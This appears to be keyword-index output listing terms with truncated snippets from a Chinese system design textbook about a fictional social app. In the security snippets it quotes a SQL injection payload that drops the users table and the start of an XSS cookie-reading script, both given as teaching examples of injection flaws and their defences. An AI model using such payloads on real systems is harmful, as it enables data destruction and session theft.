  c16_b15.md: ...timestamp": "2024-01-15T14:47:23Z"     }   HTTP 状态码：  * 200：healthy 或 degraded（负载均衡器继续路由） * 503：unhealthy（负载均衡器将其移出轮询）  **负载均衡器...

=== req (2 occurrences) ===
  c16_b15.md: ...程池，用 500 毫秒超时可在池耗尽前处理约 400 请求/秒（200 线程 / 0.5 秒 = 卡住请求吞吐 400 req/s）——相比之下，30 秒超时约 7 req/s。  新问题：如果 Redis 只是慢（高负载而非故障），某些请求确实...
  c16_b15.md: ...400 请求/秒（200 线程 / 0.5 秒 = 卡住请求吞吐 400 req/s）——相比之下，30 秒超时约 7 req/s。  新问题：如果 Redis 只是慢（高负载而非故障），某些请求确实需要 500–1000 毫秒，500 毫秒超时...

=== unhealthy (2 occurrences) ===
  c16_b15.md: ...**响应格式：**       {       "status": "healthy" | "degraded" | "unhealthy",       "checks": {         "database": {"status": "ok", "l...
  c16_b15.md: ...}   HTTP 状态码：  * 200：healthy 或 degraded（负载均衡器继续路由） * 503：unhealthy（负载均衡器将其移出轮询）  **负载均衡器行为：**...

=== switch (2 occurrences) ===
  c16_b17.md: ...体验到脆弱性之前发现并修复了它们。  混沌工程的受控本质正是其安全之处：实验在工作时间运行，团队盯着，准备了 kill switch，只影响一小部分流量。这从根本上比等待失控事件更安全。  **Q2.** 主主数据库配置允许两个数据中心（US 和 EU...
  c17_b13.md: ...：首先，告警路径应尽可能简单独立——通过它自身监控的同一基础设施路由告警的监控系统很脆弱。其次，“dead man's switch”告警有价值：不是出问题时告警，而是当关键监控*停止*接收数据时告警——如果心跳消失，说明某处坏了。第三，外部合成监控（...

=== software (2 occurrences) ===
  c16_b18.md: ...接受该写（它无法联系 EU 协调，但配置为独立接受写）。 3. 用户 A 同时（通过漫游 EU 设备）也把简介更新为 “Software Engineer”。EU 数据中心接受该写。 4. 下午 3:30，网络分区恢复。US 数据中心上 bio = "En...
  c16_b18.md: ...区恢复。US 数据中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Engineer"。同一条记录有两个冲突值。  这就是脑裂。没有冲突解决策略，就必须丢弃一个写。  防护措施：  **...

=== level (2 occurrences) ===
  c17_b04.md: ...{       "timestamp": "2024-01-15T14:47:23.441Z",       "level": "ERROR",       "service": "profile-service",       "event...
  c17_b04.md: ...—毫秒精度、UTC 时区。来自不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调...

=== pager (2 occurrences) ===
  c17_b05.md: ...FATAL 日志记录进程无法恢复并即将退出的失败：“无法绑定端口 8080”、“配置文件损坏”。FATAL 日志应触发 pager 告警。   #### 侦探与日志  回想第 3 章的福尔摩斯估算方法——从部分证据推理到确信结论。同一纪律适用于事故调...
  c17_b08.md: ...#### Pager 测试  评估告警的一个简单启发：问“如果这个告警凌晨 3 点响起，是否需要立即人工处理？”如果答案是否定的——如果告警...

=== claims (2 occurrences) ===
  c19_b03.md: ......`  Feed Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payloa...
  c19_b17.md: ...和授权是独立关注点。认证建立身份；授权决定权限。OAuth 2.0 支持第三方访问的委托授权。JWT 支持密码学可验证 claims 的无状态认证。  加密保护数据在两种场景：传输中（TLS/HTTPS 防止窃听）和静态（卷级或应用级加密防止磁盘被盗或...

=== digicert (2 occurrences) ===
  c19_b04.md: ...握手**：  1. 认证服务器：服务器出示由可信证书颁发机构（CA）签名的 TLS 证书。浏览器验证证书链——该证书由 DigiCert 签名，而 DigiCert 在浏览器证书库中可信。这证明服务器确实是 `socialsnap.com`，而不是冒充者。...
  c19_b04.md: ...器：服务器出示由可信证书颁发机构（CA）签名的 TLS 证书。浏览器验证证书链——该证书由 DigiCert 签名，而 DigiCert 在浏览器证书库中可信。这证明服务器确实是 `socialsnap.com`，而不是冒充者。 2. 协商共享密钥：使用非...

=== csp (2 occurrences) ===
  c19_b06.md: ...HTML` 之所以这样命名，是有原因的。  额外防御：**内容安全策略（Content Security Policy，CSP）**——一种 HTTP header，指示浏览器只执行可信来源的脚本（`script-src 'self'` 意味着只...
  c19_b06.md: ...执行可信来源的脚本（`script-src 'self'` 意味着只执行同源的脚本）。即使注入 XSS payload，CSP 也阻止其加载外部脚本。...

=== drop (2 occurrences) ===
  c19_b06.md: ...条件 `'1'='1'` 永远为真，因此该查询返回数据库中所有用户。攻击者完全绕过了认证。  更具破坏性的输入：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE use...
  c19_b06.md: ...; --` 使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数据丢失。  SQL 注入之所以有效，是因...

=== div (2 occurrences) ===
  c19_b06.md: ...（XSS）  SocialSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>doc...
  c19_b06.md: ...子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>document.cookie = document.cookie + docu...

=== shell (2 occurrences) ===
  c19_b07.md: ...而非 SQL”所以 API 层不会注入。  注入漏洞存在于用户输入到达解释器的任何地方——SQL、JavaScript、shell 命令、XML 解析器。原则始终相同：把代码与数据分开。   ### 19.5 零信任架构与密钥管理...
  c28_b06.md: ...（缓存、分发到边缘的 KV 存储）。  对 SocialSnap，边缘计算用于：JWT 验证、机器人检测、渲染初始页面 shell（JavaScript 框架填充的空 HTML），让浏览器在任何源站请求完成前就开始渲染。  * * *...

=== direct (2 occurrences) ===
  c19_b14.md: ...验证 JWT 并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JWT 也不能调用 Direct Messages 端点——授权检查会拒绝它。  **Q2.** SocialSnap 存储用户手机号用于双因素认证。设...
  c21_b01.md: ...cialSnap 工程团队在 v7 面临这个挑战。SocialSnap 已增长到 5000 万用户，产品路线图要求增加 Direct Message（DM）功能。决策：构建简单收件箱模型（像带聊天 UI 的邮件）还是构建带送达回执、已读回执和在线状态的...

=== iam (2 occurrences) ===
  c19_b16.md: ...理。 * **定期访问审查：** 每季度审计服务权限，识别过度授权账户。移除 90 天内未使用的权限（大多数云提供商有 IAM 访问分析工具报告未使用权限）。 * **纵深防御优于完美最小权限：** 实用框架：纵深防御意味着拥有多层保护，使任何单...
  c19_b16.md: ...纵深防御意味着拥有多层保护，使任何单层失败都不是灾难。如果你的密钥管理出色、网络分段良好、监控能捕捉异常访问模式，那么 IAM 层略微不完美的最小权限就不像这些其他防御缺失时那么危险。完美最小权限是目标，但它是多层安全中的一层，而非独立保证。...

=== pop (2 occurrences) ===
  c20_b03.md: ...提前生成所有可能的 7 字符 base-62（BASE）码（或批量生成），洗牌，存入“未用码”池。URL 创建时从池中 pop 下一个码。每个码只用一次。  保证唯一。无需冲突检查。码是随机的（非顺序）。池可分布式：多个应用服务器可从池中批量请求...
  c24_b06.md: ...→ 生成并存储清单  **分发路径（CDN 交付）：**  * 源对象存储 → 区域 CDN 缓存 → 边缘 CDN PoP → 观众设备 → 自适应码率播放器算法  **控制路径（元数据与播放启动）：**  * 观众点击播放时：API 服务器...

=== feeding (2 occurrences) ===
  c20_b10.md: ...短链的分析子系统以支持新查询：“显示我所有 URL 在过去 30 天内按国家聚合的点击。” 当前设计（Kafka 队列 feeding 数据仓库）能处理，但团队想添加实时仪表盘显示最近 5 分钟点击。  提示  考虑第 8 章的事件驱动模式。同一个 Ka...
  c20_b10.md: ...答案：** Kafka topic 已是 backbone。增强：向同一个 Kafka topic 添加第二个消费者， feeding 实时分析存储。  **架构：**...

=== admin (2 occurrences) ===
  c20_b11.md: ...了什么新攻击向量，如何缓解？  提示  思考现在谁控制命名空间，以及如果用户尝试声明 “login”、“api” 或 “admin” 作为自定义别名会发生什么。  **答案：** 自定义别名打破了键空间由系统控制的假设。需要三处改变：  1. **存...
  c20_b11.md: ...受自定义别名前，系统必须检查：(a) 别名未被占用，(b) 别名不与保留系统路径冲突（例如 `/api（API）`、`/admin`、`/login`、`/healthz`）。维护显式保留词黑名单，每次创建请求都检查。 3. **滥用向量——域名抢注...

=== login (2 occurrences) ===
  c20_b11.md: ...何改变码生成和存储系统设计？引入了什么新攻击向量，如何缓解？  提示  思考现在谁控制命名空间，以及如果用户尝试声明 “login”、“api” 或 “admin” 作为自定义别名会发生什么。  **答案：** 自定义别名打破了键空间由系统控制的假设...
  c20_b11.md: ...统必须检查：(a) 别名未被占用，(b) 别名不与保留系统路径冲突（例如 `/api（API）`、`/admin`、`/login`、`/healthz`）。维护显式保留词黑名单，每次创建请求都检查。 3. **滥用向量——域名抢注：** 恶意行为者...

=== member (2 occurrences) ===
  c20_b11.md: ...费者（消费者 2）按 `short_code` 为键把事件写入 Redis sorted set，score 为时间戳，member 为点击事件。要获取最近 5 分钟点击：`ZRANGEBYSCORE url:abc1234:clicks (NOW-3...
  c22_b04.md: ...表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:t...

=== trivial (2 occurrences) ===
  c20_b13.md: ...架构（第 8 章）把 116,000 RPS 的分析写路径与关键重定向路径解耦。水平扩展（第 11 章）使重定向服务可 trivial 扩展。数据库读副本（第 12 章）分布缓存未命中读取。  侦探简报格式——需求是线索、约束是证据、架构是结论——为案例...
  c21_b02.md: ...最简单方法：客户端每秒向服务器发一次请求：“有新消息吗？” 如果有，服务器返回；如果没有，返回空响应。  短轮询概念上 trivial——使用普通 HTTP 请求，无需特殊基础设施。但缺点严重：  * **浪费带宽：** 如果用户 5 分钟没收到消息，客...

=== websockets (2 occurrences) ===
  c21_b02.md: ...接处理。  长轮询对小型系统或不值得上 WebSocket 基础设施的系统是合理方法，但它不能优雅扩展。   #### WebSockets——实时聊天的正确答案  **WebSockets** 提供客户端与服务器之间持久、双向、全双工连接。初始 HTTP 握...
  c21_b02.md: ...cket 基础设施的系统是合理方法，但它不能优雅扩展。   #### WebSockets——实时聊天的正确答案  **WebSockets** 提供客户端与服务器之间持久、双向、全双工连接。初始 HTTP 握手把连接升级到 WebSocket 协议后，双方可...

=== dms (2 occurrences) ===
  c21_b10.md: ...TP 的 feed 和帖子系统并行运行。DM 系统与核心 feed 系统隔离（独立连接服务器、独立数据库集群），以满足 DMs 不得降低核心体验的约束。  当前架构长什么样？SocialSnap v7 拥有：  * **API gateway +...
  c21_b10.md: ...stateless，水平扩展）服务 feed、帖子、用户资料 * **连接服务器**（有状态的，stateful，管理 DMs 的 WebSocket 连接） * **PostgreSQL 集群**（按 `user_id` 分片）存储帖子和用户数...

=== push (2 occurrences) ===
  c22_b02.md: ...1. 读取 F 的 timeline 缓存——feed 已计算好 2. 立即返回：O(1) 延迟，极快  这就是 **push 模型**：帖子在写入时被推入关注者的 feed。每次写入“扇出”到 N 个位置。  **优点：** feed 读取极快...
  c22_b16.md: ...境才发现名人问题。先收集所有证据再设计的侦探纪律防止了这一失败。  第 23 章设计搜索引擎——一个完全反转 feed push 模型的系统：不是预计算向用户展示什么内容，而是用户表达想要什么内容，系统必须在数十亿文档中毫秒级找到它。倒排索引与预计...

=== affinity (2 occurrences) ===
  c22_b05.md: ...#### 排序分数计算  简单排序分数组合各信号：      score = affinity_weight × affinity(user, author)           + quality_weight × quality(post)...
  c22_b05.md: ...)           + recency_weight × recency(post.timestamp)  其中 `affinity`、`quality`、`recency` 归一化到 [0, 1]，权重之和为 1。  权重不是手动指定——而是从用户行...

=== computing (2 occurrences) ===
  c23_b04.md: ...d" 2 | "systems design requires tradeoffs" 3 | "distributed computing and consistency（一致性）" 4 | "design patterns for reliability"...
  c28_b15.md: ...动惩罚（100ms–2s） | 无状态（函数内无共享状态） | 极高（自动扩展） | 代码极低；锁定风险 **Edge computing** (Ch 28) | 极低（代码靠近用户） | 有限（无中央 DB 访问） | 极高 | 中——边缘部署流水线 **...

=== hard (2 occurrences) ===
  c23_b04.md: ...档：  Doc ID | 内容 ---|--- 1 | "distributed systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed c...
  c23_b04.md: ...-|--- distributed | [1, 3] systems | [1, 2] design | [2, 4] hard | [1] consistency | [3] tradeoffs | [2] reliability | [4]...

=== delivery (2 occurrences) ===
  c24_b04.md: ...s 是片段时长的 5%——不算灾难，但 2 小时电影中播放器要请求数百片段时会累积。  解决方案是 **Content Delivery Network（CDN）**：一个全球分布的服务器网络，把视频内容缓存到离观众近的地方。   #### 定义：CDN...
  intro.md: ...ded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 200 台由 Terraform 管理的服务器。你会看到它在负载下以真实系统崩溃的...

=== phase (2 occurrences) ===
  c25_b06.md: ...外部调用有自己的故障模式：支付处理器可能慢、拒卡或超时。计费服务必须优雅处理这些故障而不重复扣款。  模式：**Two-Phase Commit（概念上）：** 首先在自己的数据库中记录扣款意图（幂等性，idempotency）。然后调用支付处理器。...
  c28_b12.md: ...查询更高 | 强（事件日志是真相来源） | 极高（日志只追加、持久） | 极高——事件 schema 演进 **Two-phase commit (2PC)** (Ch 12) | 极高（两次网络往返） | 强（分布式 ACID） | 低——任何参与...

=== trips (2 occurrences) ===
  c25_b06.md: ...务如下：      BEGIN;       -- 锁定行程记录，防止并发计费       SELECT * FROM trips WHERE trip_id = X FOR UPDATE;            -- 验证该行程尚未计费...
  c25_b06.md: ..., type) VALUES (X, driver_payout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF;...

=== blocks (2 occurrences) ===
  c26_b12.md: ...致，随后收敛到正确状态。  **Q2.** 全书都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值...
  c26_b13.md: ...partition tolerance）。整个 quorum 讨论都是把 CAP 权衡具体化、可调化。Building Blocks（第 5–10 章）：一致性哈希（第 9 章负载均衡概念的扩展）是分区机制。键值存储本身是第 6 章（NoSQL）的主题...

=== building (2 occurrences) ===
  c26_b12.md: ...——短暂的明显不一致，随后收敛到正确状态。  **Q2.** 全书都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重...
  c26_b13.md: ...用性和分区容错性（partition tolerance）。整个 quorum 讨论都是把 CAP 权衡具体化、可调化。Building Blocks（第 5–10 章）：一致性哈希（第 9 章负载均衡概念的扩展）是分区机制。键值存储本身是第 6 章（No...

=== case (2 occurrences) ===
  c26_b12.md: ...分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值存储设计中？...
  c26_b13.md: ...。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置存储展示了高写入吞吐 Redis——现在我们理解生产版该存储内部会是什么样子。第 2...

=== foundations (2 occurrences) ===
  c26_b12.md: ...}。这就是最终一致性可见——短暂的明显不一致，随后收敛到正确状态。  **Q2.** 全书都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——...
  c26_b13.md: ...**讨论：** 这是本章综合的回顾练习。Foundations（第 1–4 章）：CAP 定理（第 4 章）是 N/W/R quorum 选择的直接理论基础。选 N=3、W=1、R=...

=== studies (2 occurrences) ===
  c26_b12.md: ...undations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值存储设计中？...
  c26_b13.md: ...时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置存储展示了高写入吞吐 Redis——现在我们理解生产版该存储内部会是什么样子。第 22 章的 tim...

=== clocks (2 occurrences) ===
  c26_b12.md: ...在不同副本上的并发写会产生冲突：两个节点现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两...
  c26_b12.md: ...键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比较 vector clocks 检测到冲突，并把两个值视为并发。对购物车：如果用户用手机加商品 A、用笔记本同时加商品 B，两次写都到达系统。若先到达...

=== sticky (2 occurrences) ===
  c27_b02.md: ...、错误率都必须可见。  **变革信号：** 单个应用服务器在高峰时段 CPU 使用率达 90%。添加第二台服务器暴露了 sticky session 问题：用户被随机路由到没有其会话的服务器。...
  c27_b11.md: ...水平扩展 + 无状态会话 | 以会话迁移 + Redis 依赖为代价获得更高吞吐 | 单服务器 90% CPU；发现 sticky session 破坏 v4 → v5 | 数据库分片 + 读副本 | 以跨分片查询复杂度和迁移痛苦为代价获得读写可扩展...

=== future (2 occurrences) ===
  c27_b04.md: ...**技术债务（technical debt）** 是今天选择更简单、实现更快的方案而非更稳健但实现更慢的方案所隐含的 future cost。它是债务，因为像金融债务一样会累积利息：拖欠越久，越难偿还。  plain 语言：技术债务是“我们实际构建的...
  c27_b13.md: ...务”，并设置 tripwire——当系统达到 X 用户或 Y QPS 时重新审视该决策。这把“未知的未知”变成“已知的 future work”，从而可管理。   ### 本章总结  本章后退一步，从具体系统抽离，审视 SocialSnap——以及扩展...

=== rot (2 occurrences) ===
  c27_b05.md: ...有 1000 万（10 million）用户，设计假设被违反了。”这种债务随着系统上下文变化而无形累积。  **Bit rot：** 旧代码从未被触碰，逐渐与当前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随着团队在...
  c27_b05.md: ...前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随着团队在周围演进编码标准，它累积 bit rot。  **架构债务：** 分片键选择（`user_id mod 8`）对当前规模有效，但限制未来选项。这是最昂贵的一类：...

=== maneuver (2 occurrences) ===
  c28_b02.md: ...#### 逆康威机动  如果康威定律是描述，那么 **Inverse Conway Maneuver** 就是处方：有意按照你想要的架构来 structuring 你的组织。  如果你想要一个具有清晰服务边界的微服务架构...
  intro.md: ...eless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneuver（逆康威策略）有时为何是最有效的架构干预手段。本书认真对待一个理念：系统由人建造，而不只是由遵循最佳实践的工程师建造。...

=== lambda (2 occurrences) ===
  c28_b04.md: ...衡和维护。开发者只为代码实际执行时间付费，而不为空闲服务器时间付费。  plain 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 provider 在需要的基础设施上运行你的函数，自动...
  c28_b05.md: ...迟 100ms–2 秒（100ms–2s），取决于运行时和包大小。这对延迟敏感路径不可接受。 * 执行时间限制：AWS Lambda 函数最多运行 15 分钟（15 minutes）。长时间运行工作负载（视频转码、机器学习训练）不适合该模型。 * 运行...

=== webhook (2 occurrences) ===
  c28_b05.md: ...追踪——与微服务相同挑战，但没有同等级别的运行时控制。  **Serverless 适用场景：** 低流量 API 和 webhook（“空闲时零成本”收益最大）；事件驱动数据处理（文件上传到 S3 时处理）；定时任务（每晚午夜运行清理作业）；快速原型（...
  c28_b05.md: ...。  对 SocialSnap，serverless 适用于：图片处理（上传时调整照片大小）、定时数据导出、第三方集成 webhook 处理器。不适用于：feed 服务（延迟敏感）、匹配服务、计费服务。  * * *...

=== rate (2 occurrences) ===
  c28_b11.md: ...9) | 低（二进制、多路复用 HTTP/2） | 无状态 | 高 | 中——protobuf schema 管理 **Rate limiting** (Ch 9) | 被限流请求增加延迟 | N/A | 保护服务可用性 | 中 **Block s...
  c28_b14.md: ...) | 极低（键查找 + 重定向） | 最终（短 URL → 长 URL 映射） | 极高（读多、可缓存） | 低 **Rate limiter (token bucket)** (Ch 20) | 微小开销 | 强——不能过度放行 | 高 | 中...

=== balancing (2 occurrences) ===
  c28_b11.md: ...终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connections load bal...
  c28_b11.md: ...ing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connections load balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 | 低 **Consistent hashing (loa...

=== circuit (2 occurrences) ===
  c28_b12.md: ...ga pattern** (Ch 14) | 中（顺序补偿） | 最终（补偿事务） | 高 | 高——补偿事务设计 **Circuit breaker** (Ch 16) | 闭合时无开销；打开时快速失败 | N/A | 极高——隔离故障 | 中...
  intro.md: ...笔记本电脑上的一个 Python 函数开始，逐章演进为全球分布式服务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 2...

=== canary (2 occurrences) ===
  c28_b13.md: ...ing** (Ch 17) | 微小开销（trace 上下文传播） | N/A | N/A | 高——所有服务插桩 **Canary deployment** (Ch 18) | 无延迟开销 | N/A | 极高——回滚即时 | 中——流量拆分机制 *...
  c28_b15.md: ...ation** (Ch 27) | 无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须维护并行系统 **Canary + feature flags (deployment)** (Ch 18, 27) | 无延迟影响 | N/A |...

=== feature (2 occurrences) ===
  c28_b13.md: ...deployment** (Ch 18) | 无延迟开销 | N/A | 极高——回滚即时 | 中——流量拆分机制 **Feature flags** (Ch 18) | 微小开销（开关检查） | N/A | 极高——即时启用/禁用 | 低–中 **Bl...
  c28_b15.md: ...Ch 27) | 无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须维护并行系统 **Canary + feature flags (deployment)** (Ch 18, 27) | 无延迟影响 | N/A | 极高 | 中 **T...

=== deployment (2 occurrences) ===
  c28_b13.md: ...Ch 17) | 微小开销（trace 上下文传播） | N/A | N/A | 高——所有服务插桩 **Canary deployment** (Ch 18) | 无延迟开销 | N/A | 极高——回滚即时 | 中——流量拆分机制 **Feature fl...
  c28_b13.md: ...(Ch 18) | 微小开销（开关检查） | N/A | 极高——即时启用/禁用 | 低–中 **Blue-green deployment** (Ch 18) | 无延迟开销 | N/A | 极高——即时切换 | 中——切换期间双倍基础设施成本 **SLI/...

=== flags (2 occurrences) ===
  c28_b13.md: ...nt** (Ch 18) | 无延迟开销 | N/A | 极高——回滚即时 | 中——流量拆分机制 **Feature flags** (Ch 18) | 微小开销（开关检查） | N/A | 极高——即时启用/禁用 | 低–中 **Blue-gre...
  c28_b15.md: ...无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须维护并行系统 **Canary + feature flags (deployment)** (Ch 18, 27) | 无延迟影响 | N/A | 极高 | 中 **Technic...

=== edge (2 occurrences) ===
  c28_b14.md: ...24) | 极低（客户端算法） | N/A | 极高（优雅降级） | 中（manifest 和分片管理） **CDN edge caching** (Ch 7, 24) | 命中极低；未命中中 | 最终（TTL 或显式失效） | 极高 | 中 *...
  c28_b15.md: ...| 冷启动惩罚（100ms–2s） | 无状态（函数内无共享状态） | 极高（自动扩展） | 代码极低；锁定风险 **Edge computing** (Ch 28) | 极低（代码靠近用户） | 有限（无中央 DB 访问） | 极高 | 中——...

=== blameless (2 occurrences) ===
  c28_b15.md: ...| 服务间更高；支持独立扩展 | 服务间最终 | 更高——部分失败隔离 | 极高——需要服务 owning 模型 **Blameless post-mortems** (Ch 28) | N/A | N/A | 随时间改善（从失败中学习） | 低——只需流...
  intro.md: ...。  最后一章跳出架构，审视人的层面：Conway's Law（康威定律）如何意味着组织架构无论你是否愿意都会塑造系统，blameless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneu...

=== mortems (2 occurrences) ===
  c28_b15.md: ...| 服务间最终 | 更高——部分失败隔离 | 极高——需要服务 owning 模型 **Blameless post-mortems** (Ch 28) | N/A | N/A | 随时间改善（从失败中学习） | 低——只需流程纪律 **Infrast...
  intro.md: ...的层面：Conway's Law（康威定律）如何意味着组织架构无论你是否愿意都会塑造系统，blameless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneuver（逆康威策略）有时为...

=== amara (2 occurrences) ===
  c28_b17.md: ...feed 浏览、分布式键值存储每秒处理 1 亿（100 million）次操作，工程团队 80 人。  两位创始人——Amara 和 Chen——仍在公司，不过都不再每天写应用代码。Amara 领导平台工程团队；Chen 领导数据基础设施团队。他们...
  c28_b17.md: ...lion）次操作，工程团队 80 人。  两位创始人——Amara 和 Chen——仍在公司，不过都不再每天写应用代码。Amara 领导平台工程团队；Chen 领导数据基础设施团队。他们都仍参与架构审查，但他们现在的主要贡献是携带的制度记忆：他们记得...

=== chen (2 occurrences) ===
  c28_b17.md: ...、分布式键值存储每秒处理 1 亿（100 million）次操作，工程团队 80 人。  两位创始人——Amara 和 Chen——仍在公司，不过都不再每天写应用代码。Amara 领导平台工程团队；Chen 领导数据基础设施团队。他们都仍参与架构审...
  c28_b17.md: ...0 人。  两位创始人——Amara 和 Chen——仍在公司，不过都不再每天写应用代码。Amara 领导平台工程团队；Chen 领导数据基础设施团队。他们都仍参与架构审查，但他们现在的主要贡献是携带的制度记忆：他们记得为什么分片键被选成那样，记得...

=== lead (2 occurrences) ===
  c28_b17.md: ...大设计决策及其当时正确的上下文。  工程团队组织成 8 个（8）服务团队，每个团队 8–12 名工程师和一名 tech lead。每个团队维护自己的服务、自己的数据库（遵循微服务原则的服务自有数据）和自己的 on-call 轮值。服务失败时，负责该...
  c28_b17.md: ...矩阵（Tradeoff Matrix）存在于一份共享文档中，永远不是“最终版”。每个重大架构决策都会新增一行。团队架构 lead 每季度审查一次，删除过时的行，并为团队考虑重新审视的选择添加上下文。  SocialSnap 仍用 PostgreSQ...

=== influxdb (2 occurrences) ===
  c28_b21.md: ...。原生支持时间窗口函数。PostgreSQL 需要 TimescaleDB 扩展或手动分区才能做到这些。3. 故障模式？InfluxDB v1 在多节点配置下有已知稳定性问题。TimescaleDB 是 PostgreSQL 扩展——故障模式已被充分理解。...
  c28_b21.md: ...B 运行在 PostgreSQL 上——SocialSnap 团队已经在运维 PostgreSQL。所需新运营专长最少。InfluxDB 需要新工具链。TimescaleDB 在运营连续性上胜出。5. 退出策略？TimescaleDB 数据存在 Postg...

=== senior (2 occurrences) ===
  c28_b22.md: ...s，期限：立即）：包含 `DROP INDEX`、`DROP TABLE` 或 `DROP COLUMN` 的迁移需要 senior 工程师的第二次批准才能合并。(4) **在生产中预迁移 dry-run**（负责：Platform 团队，期限：3 周...
  c28_b23.md: ...rtem 和 ADR——Architecture Decision Records 中）意味着新员工不需要为每个决策问 senior 工程师“我们为什么这样做？”沟通发生一次，被记录，然后传播给未来工程师，无需实时协调。  **Q2.** 回顾全部 2...

=== detective (2 occurrences) ===
  intro.md: ...一个简单的三列表格引入，每做一个重大架构决策就增加一行。到第 28 章，它已成为每位资深工程师脑中携带的完整权衡速查卡。Detective's Discipline（侦探式纪律）这条线索把系统设计框定为基于证据的推理：像收集线索一样收集需求，形成假设，排除不...
  intro.md: ...于证据的推理：像收集线索一样收集需求，形成假设，排除不可能，然后选择“最不错误”的答案。案例研究章节（第五部分）以一份“Detective's Brief（侦探简报）”开篇，把需求呈现为一个谜题——而这正是真实工程团队设计讨论的实际方式。  最后一章跳出架构...

=== big (1 occurrences) ===
  c01_b05.md: ...haviors），只在特定的负载、时机与故障组合下才出现——而这些组合你无法预测或穷举。  这并不意味着理论无用。理解 Big-O 复杂度对写出不会在负载下崩溃的代码至关重要。理解哈希函数（hash functions）对设计分布式缓存（dist...

=== thinking (1 occurrences) ===
  c01_b06.md: ...### 1.4 这本书将教你什么  书名是“System Design Thinking（系统设计思维）”，而“思维”这个词是刻意的。这不是一本答案之书。系统设计没有正确答案——只有后果被充分理解的选择。...

=== partitioning (1 occurrences) ===
  c01_b07.md: ...数据量：** 100 用户时，所有数据轻松放进一台机器。100 万用户时，数据可能超出任何单机的存储或查询能力——需要 partitioning（分区），这会破坏关系型 join，并让某些操作从根本上变得更昂贵。  **Q3.** 本章说“规模下故障是常态”。这在...

=== jargon (1 occurrences) ===
  c02_b01.md: ...进一台机器的数据。但我们的谈论很松散——就像你向朋友描述头痛一样。  要真正推理系统，你需要一种更精确的语言。不是为了 jargon（行话）本身，而是共享的词汇，让你能准确说出你的意思。当一位工程师说“这个设计延迟低但一致性差”时，你需要精确理解这句话...

=== queries (1 occurrences) ===
  c02_b01.md: ...理的操作数量。对于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）** 表示。  用大白话说：吞吐是系统能同时持续做多少件事。如果你的 Web...

=== requests (1 occurrences) ===
  c02_b01.md: ...ughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）**...

=== concurrency (1 occurrences) ===
  c02_b02.md: ...常说“我们需要低延迟和高吞吐”，仿佛它们是独立目标。它们是相关的。关系大致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个请求花 10 毫秒，同时有...

=== little (1 occurrences) ===
  c02_b02.md: ...们是相关的。关系大致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个请求花 10 毫秒，同时有 100 个并发请求在飞行中，你的吞吐是 10...

=== performance (1 occurrences) ===
  c02_b04.md: ...定期把数据复制到独立存储，这样即使灾难性故障（数据中心火灾、勒索软件）也能恢复。   #### Durability-Performance 权衡  每个持久性保证都有代价。  每次数据库变更前先写日志会增加延迟。同步地把写复制到三台机器意味着等待三个确认而不...

=== site (1 occurrences) ===
